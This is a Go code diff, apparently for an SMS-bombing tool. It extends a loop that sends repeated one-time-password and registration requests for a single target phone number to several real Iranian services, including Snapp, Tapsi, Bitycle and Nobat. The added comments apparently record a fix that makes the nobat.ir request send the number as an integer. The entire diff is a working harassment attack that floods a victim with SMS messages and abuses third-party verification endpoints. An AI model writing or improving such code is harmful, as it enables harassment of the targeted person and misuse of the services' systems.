@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"os/signal"
 	"runtime"
+	"strconv" // Import strconv for string to integer conversion
 	"strings"
 	"sync"
 )
@@ -177,14 +178,25 @@ func main() {
 
 	var wg sync.WaitGroup
 	// Create a buffered channel to receive integer status codes.
-	// Buffer size should be large enough to not block goroutines immediately.
-	// A safe bet is the total number of potential requests (repeatCount * number of APIs).
-	ch := make(chan int, repeatCount*40) 
+	// Buffer size based on the number of new APIs (8 APIs * repeatCount).
+	ch := make(chan int, repeatCount*10) // Adjusted buffer size
+
+	// Convert phone string to integer for specific APIs if needed
+	// Perform conversion once before the loop
+	phoneInt, err := strconv.Atoi(strings.TrimPrefix(phone, "0")) // Remove leading 0 and convert
+	if err != nil {
+		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Skipping APIs that require integer format.\033[0m")
+		// err is now set, and phoneInt might be 0 or another default value.
+		// The check `if conversionErr == nil` inside the goroutine will handle this.
+	}
+
 
 	// Loop to send requests concurrently
 	for i := 0; i < repeatCount; i++ {
-		
-	wg.Add(1)
+		// --- NEW API calls with specified payloads ---
+
+		// digitalsignup.snapp.ir otp (JSON) - Corrected URL with query params and JSON payload
+		wg.Add(1)
 		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)
@@ -195,29 +207,66 @@ func main() {
 			"mobile": phone,
 		}, &wg, ch)
 
-		// accounts-api.tapsi.ir (JSON) - NEW API
+		// accounts-api.tapsi.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
 			"phone_number": phone,
 		}, &wg, ch)
 
-		// api.bitycle.com register (JSON) - NEW API (different from request_otp)
+		// api.bitycle.com register (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
 			"phone": phone,
 		}, &wg, ch)
 
 		// api.nobat.ir (JSON) - Corrected payload (integer)
-		// Only send if phone number conversion to integer was successful
-		if err == nil {
-			wg.Add(1)
-			go sendJSONRequest(ctx, "https://api.nobat.ir/patient/login/phone", map[string]interface{}{
-				"mobile": phoneInt, // Use the integer version
-			}, &wg, ch)
-		} else {
-            // Optionally log that this API was skipped due to conversion error
-            // fmt.Println("\033[01;33m[!] Skipping nobat.ir request due to phone number integer conversion error.\033[0m")
-        }
+		// Pass phoneInt and err to the goroutine to ensure correct scope
+		wg.Add(1) // Add unconditionally, the goroutine will check err
+		go func(pInt int, conversionErr error) { // Pass phoneInt and err as arguments
+			defer wg.Done() // Ensure Done is called by this goroutine
+			if conversionErr == nil {
+				// Note: sendJSONRequest also calls wg.Done, so we need to adjust Add/Done logic if calling it inside here.
+				// A simpler approach is to put the logic directly here.
+				payload := map[string]interface{}{
+					"mobile": pInt, // Use the integer version passed as argument
+				}
+				jsonData, marshalErr := json.Marshal(payload)
+				if marshalErr != nil {
+					fmt.Println("\033[01;31m[-] Error while encoding JSON for api.nobat.ir!\033[0m")
+					ch <- http.StatusInternalServerError
+					return
+				}
+
+				req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, "https://api.nobat.ir/patient/login/phone", bytes.NewBuffer(jsonData))
+				if reqErr != nil {
+					fmt.Println("\033[01;31m[-] Error while creating request to api.nobat.ir!\033[0m", reqErr)
+					ch <- http.StatusInternalServerError
+					return
+				}
+				req.Header.Set("Content-Type", "application/json")
+
+				resp, clientErr := http.DefaultClient.Do(req)
+				if clientErr != nil {
+					if ctx.Err() == context.Canceled {
+						fmt.Println("\033[01;33m[!] Request to api.nobat.ir canceled.\033[0m")
+						ch <- 0
+						return
+					}
+					fmt.Println("\033[01;31m[-] Error while sending request to api.nobat.ir!", clientErr)
+					ch <- http.StatusInternalServerError
+					return
+				}
+				defer resp.Body.Close()
+				ch <- resp.StatusCode
+
+			} else {
+				// If conversion failed, report an error status or skip silently
+				// Report a specific code (e.g., 500) to indicate an internal issue with the request setup
+				ch <- http.StatusInternalServerError
+				// Optionally log that this API was skipped due to conversion error
+				// fmt.Println("\033[01;33m[!] Skipping nobat.ir request due to phone number integer conversion error.\033[0m")
+			}
+		}(phoneInt, err) // Pass the current values of phoneInt and err
 
 
 		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
@@ -238,14 +287,7 @@ func main() {
 			"username": phone,
 		}, &wg, ch)
 
-
-		// digitalsignup.snapp.ir otp (JSON)
-		// Note: The URL also contains the cellphone number as a query param.
-		// We will send the payload as JSON as requested.
-		wg.Add(1)
-		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=%v", phone), map[string]interface{}{
-			"cellphone": phone, // Assuming the intent was to send the phone number in the payload key "cellphone"
-		}, &wg, ch)
+	}
 
 	// Goroutine to wait for all requests to complete and then close the channel.
 	go func() {
@@ -263,5 +305,6 @@ func main() {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended") // Success message format from smstest.go
 		}
 	}
-}
+
+	// The final "All requests processed." message is still omitted to match smstest.go style.
 }
